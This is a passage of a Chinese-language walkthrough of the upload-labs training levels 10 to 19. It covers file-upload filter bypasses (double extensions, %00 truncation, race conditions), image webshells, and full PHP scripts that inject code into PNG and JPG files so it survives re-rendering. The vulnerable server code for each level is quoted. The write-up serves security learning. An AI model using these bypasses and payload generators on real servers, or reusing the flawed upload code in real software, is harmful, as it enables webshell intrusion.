            } else {
                $msg = &#39;上传出错！&#39;;
            }
        } else {
            $msg = &#39;此文件类型不允许上传！&#39;;
        }
    } else {
        $msg = UPLOAD_PATH . &#39;文件夹不存在,请手工创建！&#39;;
    }
}
</code></pre>
<h2 id="Less-10"><a href="#Less-10" class="headerlink" title="Less-10"></a>Less-10</h2><blockquote>
<p>shell.pphphp</p>
<p>str_replace() 函数匹配一次，双写绕过</p>
</blockquote>
<p>本关看到很熟悉的函数<code>str_ireplace()</code>，与<code>str_replace()</code>的区别就是大小写敏感，他们都只进行一次匹配，所以可以直接双写绕过</p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/upload-labs/10-1.png" alt></p>
<p>可以访问并解析</p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/upload-labs/10-2.png" alt></p>
<p><strong>核心代码</strong></p>
<pre><code class="php">$is_upload = false;
$msg = null;
if (isset($_POST[&#39;submit&#39;])) {
    if (file_exists(UPLOAD_PATH)) {
        $deny_ext = array(&quot;php&quot;,&quot;php5&quot;,&quot;php4&quot;,&quot;php3&quot;,&quot;php2&quot;,&quot;html&quot;,&quot;htm&quot;,&quot;phtml&quot;,&quot;pht&quot;,&quot;jsp&quot;,&quot;jspa&quot;,&quot;jspx&quot;,&quot;jsw&quot;,&quot;jsv&quot;,&quot;jspf&quot;,&quot;jtml&quot;,&quot;asp&quot;,&quot;aspx&quot;,&quot;asa&quot;,&quot;asax&quot;,&quot;ascx&quot;,&quot;ashx&quot;,&quot;asmx&quot;,&quot;cer&quot;,&quot;swf&quot;,&quot;htaccess&quot;);

        $file_name = trim($_FILES[&#39;upload_file&#39;][&#39;name&#39;]);
        $file_name = str_ireplace($deny_ext,&quot;&quot;, $file_name);
        $temp_file = $_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;];
        $img_path = UPLOAD_PATH.&#39;/&#39;.$file_name;        
        if (move_uploaded_file($temp_file, $img_path)) {
            $is_upload = true;
        } else {
            $msg = &#39;上传出错！&#39;;
        }
    } else {
        $msg = UPLOAD_PATH . &#39;文件夹不存在,请手工创建！&#39;;
    }
}
</code></pre>
<h2 id="Less-11"><a href="#Less-11" class="headerlink" title="Less-11"></a>Less-11</h2><blockquote>
<p>move_uploaded_file() 的 %00 截断（CVE-2015-2348）</p>
</blockquote>
<p>关于<code>%00</code>截断绕过可以参考这篇文章：<a href="http://www.admintony.com/%e5%85%b3%e4%ba%8e%e4%b8%8a%e4%bc%a0%e4%b8%ad%e7%9a%8400%e6%88%aa%e6%96%ad%e5%88%86%e6%9e%90.html" target="_blank" rel="noopener">关于上传中的00截断分析</a></p>
<p>%00 截断是比较古老的漏洞，而且必须要有 2 个前提</p>
<pre><code>php 版本低于 5.3.29
php.ini 的 magic_quotes_gpc = Off
</code></pre><p>文件上传的位置用了<code>$_GET[&#39;save_path&#39;]</code>，与文件后缀的检查分开了，所以我们可以通过控制<code>$_GET[&#39;save_path&#39;]</code>的值来控制文件名称，使用<code>%00</code>截断后面的其他内容，使得<code>$img_path</code>的值就只等于<code>$_GET[&#39;save_path&#39;]</code></p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/upload-labs/11-1.png" alt></p>
<p>上传的文件名正常，如我们意料地被截断了</p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/upload-labs/11-3.png" alt></p>
<p>可以访问并解析</p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/upload-labs/11-2.png" alt></p>
<p><strong>核心代码</strong></p>
<pre><code class="php">$is_upload = false;
$msg = null;
if(isset($_POST[&#39;submit&#39;])){
    $ext_arr = array(&#39;jpg&#39;,&#39;png&#39;,&#39;gif&#39;);
    $file_ext = substr($_FILES[&#39;upload_file&#39;][&#39;name&#39;],strrpos($_FILES[&#39;upload_file&#39;][&#39;name&#39;],&quot;.&quot;)+1);
    if(in_array($file_ext,$ext_arr)){
        $temp_file = $_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;];
        $img_path = $_GET[&#39;save_path&#39;].&quot;/&quot;.rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_ext;

        if(move_uploaded_file($temp_file,$img_path)){
            $is_upload = true;
        } else {
            $msg = &#39;上传出错！&#39;;
        }
    } else{
        $msg = &quot;只允许上传.jpg|.png|.gif类型文件！&quot;;
    }
}
</code></pre>
<h2 id="Less-12"><a href="#Less-12" class="headerlink" title="Less-12"></a>Less-12</h2><blockquote>
<p>shell.php%00(urldecode)</p>
</blockquote>
<p>本关其他代码没变，只是<code>save_path</code>由<code>GET</code>变成了<code>POST</code>。方法还是一样，但是由于 POST 方式不会自动进行<code>URL解码</code>，</p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/upload-labs/12-1.png" alt></p>
<p>所以需要将<code>%00</code>手动解码之后再放进去，否则会报错</p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/upload-labs/12-2.png" alt></p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/upload-labs/12-3.png" alt></p>
<p><strong>核心代码</strong></p>
<pre><code class="php">$is_upload = false;
$msg = null;
if(isset($_POST[&#39;submit&#39;])){
    $ext_arr = array(&#39;jpg&#39;,&#39;png&#39;,&#39;gif&#39;);
    $file_ext = substr($_FILES[&#39;upload_file&#39;][&#39;name&#39;],strrpos($_FILES[&#39;upload_file&#39;][&#39;name&#39;],&quot;.&quot;)+1);
    if(in_array($file_ext,$ext_arr)){
        $temp_file = $_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;];
        $img_path = $_POST[&#39;save_path&#39;].&quot;/&quot;.rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_ext;

        if(move_uploaded_file($temp_file,$img_path)){
            $is_upload = true;
        } else {
            $msg = &quot;上传失败&quot;;
        }
    } else {
        $msg = &quot;只允许上传.jpg|.png|.gif类型文件！&quot;;
    }
}
</code></pre>
<h2 id="Less-13"><a href="#Less-13" class="headerlink" title="Less-13"></a>Less-13</h2><blockquote>
<p>本地文件包含 + 图片马</p>
<p>图片马制作：copy normal.jpg /b + shell.php /a shell.jpg</p>
</blockquote>
<p>出现了新的提示</p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/upload-labs/13-1.png" alt></p>
<p>从源代码可以看出来，对文件的读取只读了<code>2个字节</code>，然后判断类型，并且将类型直接作为文件最后的后缀。这个就没办法绕过了，只能写进去图片马，找<code>include()</code>或者<code>解析漏洞</code>来用马。生成图片马：</p>
<pre><code>copy normal.jpg /b + shell.php /a webshell.jpg
</code></pre><p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/upload-labs/13-2.png" alt></p>
<p>然后上传</p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/upload-labs/13-3.png" alt></p>
<p>我们在服务器内写一个能够<code>文件包含</code>的页面，模拟漏洞 本地文件包含 的漏洞（include 的文件都当做php文件来解析）</p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/upload-labs/13-4.png" alt></p>
<p>然后查看图片马的名称，并包含我们的图片马</p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/upload-labs/13-5.png" alt></p>
<p>写一句话，然后菜刀连接</p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/upload-labs/13-6.png" alt></p>
<p><strong>核心代码</strong></p>
<pre><code class="php">function getReailFileType($filename){
    $file = fopen($filename, &quot;rb&quot;);
    $bin = fread($file, 2); //只读2字节
    fclose($file);
    $strInfo = @unpack(&quot;C2chars&quot;, $bin);
    $typeCode = intval($strInfo[&#39;chars1&#39;].$strInfo[&#39;chars2&#39;]);
    $fileType = &#39;&#39;;
    switch($typeCode){
        case 255216:
            $fileType = &#39;jpg&#39;;
            break;
        case 13780:            
            $fileType = &#39;png&#39;;
            break;        
        case 7173:            
            $fileType = &#39;gif&#39;;
            break;
        default:            
            $fileType = &#39;unknown&#39;;
        }    
        return $fileType;
}

$is_upload = false;
$msg = null;
if(isset($_POST[&#39;submit&#39;])){
    $temp_file = $_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;];
    $file_type = getReailFileType($temp_file);

    if($file_type == &#39;unknown&#39;){
        $msg = &quot;文件未知，上传失败！&quot;;
    }else{
        $img_path = UPLOAD_PATH.&quot;/&quot;.rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_type;
        if(move_uploaded_file($temp_file,$img_path)){
            $is_upload = true;
        } else {
            $msg = &quot;上传出错！&quot;;
        }
    }
}
</code></pre>
<h2 id="Less-14"><a href="#Less-14" class="headerlink" title="Less-14"></a>Less-14</h2><blockquote>
<p>本地文件包含 + 图片马</p>
<p>getimagesize()</p>
<p>image_type_to_extension()</p>
</blockquote>
<p><code>getimagesize()</code>函数</p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/upload-labs/14-1.png" alt></p>
<p><code>image_type_to_extension()</code>函数</p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/upload-labs/14-2.png" alt></p>
<p>所以本关是通过<code>getimagesize()</code>获取到类型，上一关的方法还可以使用</p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/upload-labs/13-6.png" alt></p>
<p><strong>核心代码</strong></p>
<pre><code class="php">function isImage($filename){
    $types = &#39;.jpeg|.png|.gif&#39;;
    if(file_exists($filename)){
        $info = getimagesize($filename);
        $ext = image_type_to_extension($info[2]);
        if(stripos($types,$ext)&gt;=0){
            return $ext;
        }else{
            return false;
        }
    }else{
        return false;
    }
}

$is_upload = false;
$msg = null;
if(isset($_POST[&#39;submit&#39;])){
    $temp_file = $_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;];
    $res = isImage($temp_file);
    if(!$res){
        $msg = &quot;文件未知，上传失败！&quot;;
    }else{
        $img_path = UPLOAD_PATH.&quot;/&quot;.rand(10, 99).date(&quot;YmdHis&quot;).$res;
        if(move_uploaded_file($temp_file,$img_path)){
            $is_upload = true;
        } else {
            $msg = &quot;上传出错！&quot;;
        }
    }
}
</code></pre>
<h2 id="Less-15"><a href="#Less-15" class="headerlink" title="Less-15"></a>Less-15</h2><blockquote>
<p>本地文件包含 + 图片马</p>
<p>exif_imagetype()</p>
</blockquote>
<p><code>exif_imagetype()</code></p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/upload-labs/15-1.png" alt></p>
<p>同样用13、14关的方法</p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/upload-labs/13-6.png" alt></p>
<p><strong>核心代码</strong></p>
<pre><code class="php">function isImage($filename){
    //需要开启php_exif模块
    $image_type = exif_imagetype($filename);
    switch ($image_type) {
        case IMAGETYPE_GIF:
            return &quot;gif&quot;;
            break;
        case IMAGETYPE_JPEG:
            return &quot;jpg&quot;;
            break;
        case IMAGETYPE_PNG:
            return &quot;png&quot;;
            break;    
        default:
            return false;
            break;
    }
}

$is_upload = false;
$msg = null;
if(isset($_POST[&#39;submit&#39;])){
    $temp_file = $_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;];
    $res = isImage($temp_file);
    if(!$res){
        $msg = &quot;文件未知，上传失败！&quot;;
    }else{
        $img_path = UPLOAD_PATH.&quot;/&quot;.rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$res;
        if(move_uploaded_file($temp_file,$img_path)){
            $is_upload = true;
        } else {
            $msg = &quot;上传出错！&quot;;
        }
    }
}
</code></pre>
<h2 id="Less-16"><a href="#Less-16" class="headerlink" title="Less-16"></a>Less-16</h2><blockquote>
<p>本地文件包含 + 图片马</p>
<p>imagecreatefromgif</p>
</blockquote>
<p>本关可以参考超详细的文章： <a href="https://xz.aliyun.com/t/2657" target="_blank" rel="noopener">upload-labs之pass 16详细分析</a></p>
<p>先判断文件是否是图片，如果是的话，进行二次渲染</p>
<p>本关就无法使用前 3 关用的图片马了，因为关键的一句话会被去掉，先看一下前面使用的图片马一句话的位置</p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/upload-labs/16-1.png" alt></p>
<p>可以看到一句话在文件末尾，即直接拼接在图片数据后面。将其上传，然后在服务器端看一下上传的图片马</p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/upload-labs/16-2.png" alt></p>
<p>可以看到末尾关键的一句话已经被删掉了。那么本题的挺多种方法，一种方法就是自己去尝试，上传前的 图片马 与 被渲染之后的图片 哪部分相同，说明函数对那部分是不做修改处理，就可以在里面插入 一句话；另一种方法用大佬的脚本生成图片马</p>
<p><strong>PNG</strong></p>
<pre><code class="php">&lt;?php
$p = array(0xa3, 0x9f, 0x67, 0xf7, 0x0e, 0x93, 0x1b, 0x23,
           0xbe, 0x2c, 0x8a, 0xd0, 0x80, 0xf9, 0xe1, 0xae,
           0x22, 0xf6, 0xd9, 0x43, 0x5d, 0xfb, 0xae, 0xcc,
           0x5a, 0x01, 0xdc, 0x5a, 0x01, 0xdc, 0xa3, 0x9f,
           0x67, 0xa5, 0xbe, 0x5f, 0x76, 0x74, 0x5a, 0x4c,
           0xa1, 0x3f, 0x7a, 0xbf, 0x30, 0x6b, 0x88, 0x2d,
           0x60, 0x65, 0x7d, 0x52, 0x9d, 0xad, 0x88, 0xa1,
           0x66, 0x44, 0x50, 0x33);

$img = imagecreatetruecolor(32, 32);

for ($y = 0; $y &lt; sizeof($p); $y += 3) {
   $r = $p[$y];
   $g = $p[$y+1];
   $b = $p[$y+2];
   $color = imagecolorallocate($img, $r, $g, $b);
   imagesetpixel($img, round($y / 3), 0, $color);
}

imagepng($img,&#39;./1.png&#39;);
?&gt;
</code></pre>
<p>运行如上脚本获取PNG图片马</p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/upload-labs/16-3.png" alt></p>
<p>成功上传，然后连接</p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/upload-labs/16-4.png" alt></p>
<p>Ps：如报错<code>Call to undefined function imagecreatetruecolor()</code>，是因为没有开启php的gd库，Linux 安装即可，Windwos 去修改 php.ini</p>
<pre><code>sudo apt-get install php-gd
</code></pre><p><strong>JPG</strong></p>
<pre><code class="php">&lt;?php
    /*

    The algorithm of injecting the payload into the JPG image, which will keep unchanged after transformations caused by PHP functions imagecopyresized() and imagecopyresampled().
    It is necessary that the size and quality of the initial image are the same as those of the processed image.

    1) Upload an arbitrary image via secured files upload script
    2) Save the processed image and launch:
    jpg_payload.php &lt;jpg_name.jpg&gt;

    In case of successful injection you will get a specially crafted image, which should be uploaded again.

    Since the most straightforward injection method is used, the following problems can occur:
    1) After the second processing the injected data may become partially corrupted.
    2) The jpg_payload.php script outputs &quot;Something&#39;s wrong&quot;.
    If this happens, try to change the payload (e.g. add some symbols at the beginning) or try another initial image.

    Sergey Bobrov @Black2Fan.

    See also:
    https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/

    */

    $miniPayload = &quot;&lt;?=phpinfo();?&gt;&quot;;


    if(!extension_loaded(&#39;gd&#39;) || !function_exists(&#39;imagecreatefromjpeg&#39;)) {
        die(&#39;php-gd is not installed&#39;);
    }

    if(!isset($argv[1])) {
        die(&#39;php jpg_payload.php &lt;jpg_name.jpg&gt;&#39;);
    }

    set_error_handler(&quot;custom_error_handler&quot;);

    for($pad = 0; $pad &lt; 1024; $pad++) {
        $nullbytePayloadSize = $pad;
        $dis = new DataInputStream($argv[1]);
        $outStream = file_get_contents($argv[1]);
        $extraBytes = 0;
        $correctImage = TRUE;

        if($dis-&gt;readShort() != 0xFFD8) {
            die(&#39;Incorrect SOI marker&#39;);
        }

        while((!$dis-&gt;eof()) &amp;&amp; ($dis-&gt;readByte() == 0xFF)) {
            $marker = $dis-&gt;readByte();
            $size = $dis-&gt;readShort() - 2;
            $dis-&gt;skip($size);
            if($marker === 0xDA) {
                $startPos = $dis-&gt;seek();
                $outStreamTmp = 
                    substr($outStream, 0, $startPos) . 
                    $miniPayload . 
                    str_repeat(&quot;\0&quot;,$nullbytePayloadSize) . 
                    substr($outStream, $startPos);
                checkImage(&#39;_&#39;.$argv[1], $outStreamTmp, TRUE);
                if($extraBytes !== 0) {
                    while((!$dis-&gt;eof())) {
                        if($dis-&gt;readByte() === 0xFF) {
                            if($dis-&gt;readByte !== 0x00) {
                                break;
                            }
                        }
                    }
                    $stopPos = $dis-&gt;seek() - 2;
                    $imageStreamSize = $stopPos - $startPos;
                    $outStream = 
                        substr($outStream, 0, $startPos) . 
                        $miniPayload . 
                        substr(
                            str_repeat(&quot;\0&quot;,$nullbytePayloadSize).
                                substr($outStream, $startPos, $imageStreamSize),
                            0,
                            $nullbytePayloadSize+$imageStreamSize-$extraBytes) . 
                                substr($outStream, $stopPos);
                } elseif($correctImage) {
                    $outStream = $outStreamTmp;
                } else {
                    break;
                }
                if(checkImage(&#39;payload_&#39;.$argv[1], $outStream)) {
                    die(&#39;Success!&#39;);
                } else {
                    break;
                }
            }
        }
    }
    unlink(&#39;payload_&#39;.$argv[1]);
    die(&#39;Something\&#39;s wrong&#39;);

    function checkImage($filename, $data, $unlink = FALSE) {
        global $correctImage;
        file_put_contents($filename, $data);
        $correctImage = TRUE;
        imagecreatefromjpeg($filename);
        if($unlink)
            unlink($filename);
        return $correctImage;
    }

    function custom_error_handler($errno, $errstr, $errfile, $errline) {
        global $extraBytes, $correctImage;
        $correctImage = FALSE;
        if(preg_match(&#39;/(\d+) extraneous bytes before marker/&#39;, $errstr, $m)) {
            if(isset($m[1])) {
                $extraBytes = (int)$m[1];
            }
        }
    }

    class DataInputStream {
        private $binData;
        private $order;
        private $size;

        public function __construct($filename, $order = false, $fromString = false) {
            $this-&gt;binData = &#39;&#39;;
            $this-&gt;order = $order;
            if(!$fromString) {
                if(!file_exists($filename) || !is_file($filename))
                    die(&#39;File not exists [&#39;.$filename.&#39;]&#39;);
                $this-&gt;binData = file_get_contents($filename);
            } else {
                $this-&gt;binData = $filename;
            }
            $this-&gt;size = strlen($this-&gt;binData);
        }

        public function seek() {
            return ($this-&gt;size - strlen($this-&gt;binData));
        }

        public function skip($skip) {
            $this-&gt;binData = substr($this-&gt;binData, $skip);
        }

        public function readByte() {
            if($this-&gt;eof()) {
                die(&#39;End Of File&#39;);
            }
            $byte = substr($this-&gt;binData, 0, 1);
            $this-&gt;binData = substr($this-&gt;binData, 1);
            return ord($byte);
        }

        public function readShort() {
            if(strlen($this-&gt;binData) &lt; 2) {
                die(&#39;End Of File&#39;);
            }
            $short = substr($this-&gt;binData, 0, 2);
            $this-&gt;binData = substr($this-&gt;binData, 2);
            if($this-&gt;order) {
                $short = (ord($short[1]) &lt;&lt; 8) + ord($short[0]);
            } else {
                $short = (ord($short[0]) &lt;&lt; 8) + ord($short[1]);
            }
            return $short;
        }

        public function eof() {
            return !$this-&gt;binData||(strlen($this-&gt;binData) === 0);
        }
    }
?&gt;
</code></pre>
<p>先上传一张 jpg 图片 到服务器上，然后将其下载下来（被服务器处理完了），然后用脚本处理它</p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/upload-labs/16-5.png" alt></p>
<p>将处理完的图片上传，然后可以通过改变代码中的 payload 来执行不同的语句（后来发现这个代码无法处理太长的 payload和<code>$</code>符号，以及有些代码，只能看实际情况再调整了）</p>
<pre><code>&lt;?=var_dump(getcwd());?&gt;
</code></pre><p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/upload-labs/16-6.png" alt></p>
<p><strong>核心代码</strong></p>
<pre><code class="php">$is_upload = false;
$msg = null;
if (isset($_POST[&#39;submit&#39;])){
    // 获得上传文件的基本信息，文件名，类型，大小，临时文件路径
    $filename = $_FILES[&#39;upload_file&#39;][&#39;name&#39;];
    $filetype = $_FILES[&#39;upload_file&#39;][&#39;type&#39;];
    $tmpname = $_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;];

    $target_path=UPLOAD_PATH.&#39;/&#39;.basename($filename);

    // 获得上传文件的扩展名
    $fileext= substr(strrchr($filename,&quot;.&quot;),1);

    //判断文件后缀与类型，合法才进行上传操作
    if(($fileext == &quot;jpg&quot;) &amp;&amp; ($filetype==&quot;image/jpeg&quot;)){
        if(move_uploaded_file($tmpname,$target_path)){
            //使用上传的图片生成新的图片
            $im = imagecreatefromjpeg($target_path);

            if($im == false){
                $msg = &quot;该文件不是jpg格式的图片！&quot;;
                @unlink($target_path);
            }else{
                //给新图片指定文件名
                srand(time());
                $newfilename = strval(rand()).&quot;.jpg&quot;;
                //显示二次渲染后的图片（使用用户上传图片生成的新图片）
                $img_path = UPLOAD_PATH.&#39;/&#39;.$newfilename;
                imagejpeg($im,$img_path);
                @unlink($target_path);
                $is_upload = true;
            }
        } else {
            $msg = &quot;上传出错！&quot;;
        }

    }else if(($fileext == &quot;png&quot;) &amp;&amp; ($filetype==&quot;image/png&quot;)){
        if(move_uploaded_file($tmpname,$target_path)){
            //使用上传的图片生成新的图片
            $im = imagecreatefrompng($target_path);

            if($im == false){
                $msg = &quot;该文件不是png格式的图片！&quot;;
                @unlink($target_path);
            }else{
                 //给新图片指定文件名
                srand(time());
                $newfilename = strval(rand()).&quot;.png&quot;;
                //显示二次渲染后的图片（使用用户上传图片生成的新图片）
                $img_path = UPLOAD_PATH.&#39;/&#39;.$newfilename;
                imagepng($im,$img_path);

                @unlink($target_path);
                $is_upload = true;               
            }
        } else {
            $msg = &quot;上传出错！&quot;;
        }

    }else if(($fileext == &quot;gif&quot;) &amp;&amp; ($filetype==&quot;image/gif&quot;)){
        if(move_uploaded_file($tmpname,$target_path)){
            //使用上传的图片生成新的图片
            $im = imagecreatefromgif($target_path);
            if($im == false){
                $msg = &quot;该文件不是gif格式的图片！&quot;;
                @unlink($target_path);
            }else{
                //给新图片指定文件名
                srand(time());
                $newfilename = strval(rand()).&quot;.gif&quot;;
                //显示二次渲染后的图片（使用用户上传图片生成的新图片）
                $img_path = UPLOAD_PATH.&#39;/&#39;.$newfilename;
                imagegif($im,$img_path);

                @unlink($target_path);
                $is_upload = true;
            }
        } else {
            $msg = &quot;上传出错！&quot;;
        }
    }else{
        $msg = &quot;只允许上传后缀为.jpg|.png|.gif的图片文件！&quot;;
    }
}

</code></pre>
<h2 id="Less-17"><a href="#Less-17" class="headerlink" title="Less-17"></a>Less-17</h2><blockquote>
<p>条件竞争</p>
</blockquote>
<p>上传一句话时抓包，然后在<code>Intruder-&gt;Payload Sets-&gt;Payload type</code>处设置<code>Null payloads</code>，因为我们是重发数据包，没有要改变的 payload。然后设置重发次数，点击<code>Start attack</code>开始重发</p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/upload-labs/17-1.png" alt></p>
<p>在重发的时候浏览器多次访问<code>shell</code>，就可以获取到</p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/upload-labs/17-2.png" alt></p>
<p><strong>核心代码</strong></p>
<pre><code class="php">$is_upload = false;
$msg = null;

if(isset($_POST[&#39;submit&#39;])){
    $ext_arr = array(&#39;jpg&#39;,&#39;png&#39;,&#39;gif&#39;);
    $file_name = $_FILES[&#39;upload_file&#39;][&#39;name&#39;];
    $temp_file = $_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;];
    $file_ext = substr($file_name,strrpos($file_name,&quot;.&quot;)+1);
    $upload_file = UPLOAD_PATH . &#39;/&#39; . $file_name;

    if(move_uploaded_file($temp_file, $upload_file)){
        if(in_array($file_ext,$ext_arr)){
             $img_path = UPLOAD_PATH . &#39;/&#39;. rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_ext;
             rename($upload_file, $img_path);
             $is_upload = true;
        }else{
            $msg = &quot;只允许上传.jpg|.png|.gif类型文件！&quot;;
            unlink($upload_file);
        }
    }else{
        $msg = &#39;上传出错！&#39;;
    }
}
</code></pre>
<h2 id="Less-18"><a href="#Less-18" class="headerlink" title="Less-18"></a>Less-18</h2><blockquote>
<p>图片马 + 条件竞争</p>
</blockquote>
<p>本关需要上传图片马，服务器会对上传的图片马进行重命名，通过条件竞争，在服务器端还未<code>rename</code>的时候访问，不再赘述</p>
<p><strong>核心代码</strong></p>
<pre><code class="php">//index.php
$is_upload = false;
$msg = null;
if (isset($_POST[&#39;submit&#39;]))
{
    require_once(&quot;./myupload.php&quot;);
    $imgFileName =time();
    $u = new MyUpload($_FILES[&#39;upload_file&#39;][&#39;name&#39;], $_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;], $_FILES[&#39;upload_file&#39;][&#39;size&#39;],$imgFileName);
    $status_code = $u-&gt;upload(UPLOAD_PATH);
    switch ($status_code) {
        case 1:
            $is_upload = true;
            $img_path = $u-&gt;cls_upload_dir . $u-&gt;cls_file_rename_to;
            break;
        case 2:
            $msg = &#39;文件已经被上传，但没有重命名。&#39;;
            break; 
        case -1:
            $msg = &#39;这个文件不能上传到服务器的临时文件存储目录。&#39;;
            break; 
        case -2:
            $msg = &#39;上传失败，上传目录不可写。&#39;;
            break; 
        case -3:
            $msg = &#39;上传失败，无法上传该类型文件。&#39;;
            break; 
        case -4:
            $msg = &#39;上传失败，上传的文件过大。&#39;;
            break; 
        case -5:
            $msg = &#39;上传失败，服务器已经存在相同名称文件。&#39;;
            break; 
        case -6:
            $msg = &#39;文件无法上传，文件不能复制到目标目录。&#39;;
            break;      
        default:
            $msg = &#39;未知错误！&#39;;
            break;
    }
}

//myupload.php
class MyUpload{
......
......
...... 
  var $cls_arr_ext_accepted = array(
      &quot;.doc&quot;, &quot;.xls&quot;, &quot;.txt&quot;, &quot;.pdf&quot;, &quot;.gif&quot;, &quot;.jpg&quot;, &quot;.zip&quot;, &quot;.rar&quot;, &quot;.7z&quot;,&quot;.ppt&quot;,
      &quot;.html&quot;, &quot;.xml&quot;, &quot;.tiff&quot;, &quot;.jpeg&quot;, &quot;.png&quot; );

......
......
......  
  /** upload()
   **
   ** Method to upload the file.
   ** This is the only method to call outside the class.
   ** @para String name of directory we upload to
   ** @returns void
  **/
  function upload( $dir ){

    $ret = $this-&gt;isUploadedFile();

    if( $ret != 1 ){
      return $this-&gt;resultUpload( $ret );
    }

    $ret = $this-&gt;setDir( $dir );
    if( $ret != 1 ){
      return $this-&gt;resultUpload( $ret );
    }

    $ret = $this-&gt;checkExtension();
    if( $ret != 1 ){
      return $this-&gt;resultUpload( $ret );
    }

    $ret = $this-&gt;checkSize();
    if( $ret != 1 ){
      return $this-&gt;resultUpload( $ret );    
    }

    // if flag to check if the file exists is set to 1

    if( $this-&gt;cls_file_exists == 1 ){

      $ret = $this-&gt;checkFileExists();
      if( $ret != 1 ){
        return $this-&gt;resultUpload( $ret );    
      }
    }

    // if we are here, we are ready to move the file to destination

    $ret = $this-&gt;move();
    if( $ret != 1 ){
      return $this-&gt;resultUpload( $ret );    
    }

    // check if we need to rename the file

    if( $this-&gt;cls_rename_file == 1 ){
      $ret = $this-&gt;renameFile();
      if( $ret != 1 ){
        return $this-&gt;resultUpload( $ret );    
      }
    }

    // if we are here, everything worked as planned :)

    return $this-&gt;resultUpload( &quot;SUCCESS&quot; );

  }
......
......
...... 
};
</code></pre>
<h2 id="Less-19"><a href="#Less-19" class="headerlink" title="Less-19"></a>Less-19</h2><blockquote>
<p>move_uploaded_file() 的 %00 截断（CVE-2015-2348）</p>
</blockquote>
<p>源码中看到<code>move_uploaded_file()</code>直接使用了我们<code>$_POST[&#39;save_name&#39;]</code>，所以思路从这里入手，想到了<code>%00</code>截断。然后利用<code>pathinfo()</code>处理的后缀，绕过黑名单</p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/upload-labs/19-1.png" alt></p>
<p>加上<code>%00</code></p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/upload-labs/19-2.png" alt></p>
<p>可以访问并解析</p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/upload-labs/19-3.png" alt></p>
<p><strong>核心代码</strong></p>
<pre><code class="php">$is_upload = false;
$msg = null;
if (isset($_POST[&#39;submit&#39;])) {
    if (file_exists(UPLOAD_PATH)) {
        $deny_ext = array(&quot;php&quot;,&quot;php5&quot;,&quot;php4&quot;,&quot;php3&quot;,&quot;php2&quot;,&quot;html&quot;,&quot;htm&quot;,&quot;phtml&quot;,&quot;pht&quot;,&quot;jsp&quot;,&quot;jspa&quot;,&quot;jspx&quot;,&quot;jsw&quot;,&quot;jsv&quot;,&quot;jspf&quot;,&quot;jtml&quot;,&quot;asp&quot;,&quot;aspx&quot;,&quot;asa&quot;,&quot;asax&quot;,&quot;ascx&quot;,&quot;ashx&quot;,&quot;asmx&quot;,&quot;cer&quot;,&quot;swf&quot;,&quot;htaccess&quot;);

        $file_name = $_POST[&#39;save_name&#39;];
        $file_ext = pathinfo($file_name,PATHINFO_EXTENSION);

        if(!in_array($file_ext,$deny_ext)) {
            $temp_file = $_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;];
            $img_path = UPLOAD_PATH . &#39;/&#39; .$file_name;
            if (move_uploaded_file($temp_file, $img_path)) { 
                $is_upload = true;
            }else{
                $msg = &#39;上传出错！&#39;;
            }
        }else{
            $msg = &#39;禁止保存为该类型文件！&#39;;
        }

    } else {
        $msg = UPLOAD_PATH . &#39;文件夹不存在,请手工创建！&#39;;
    }
}
</code></pre>
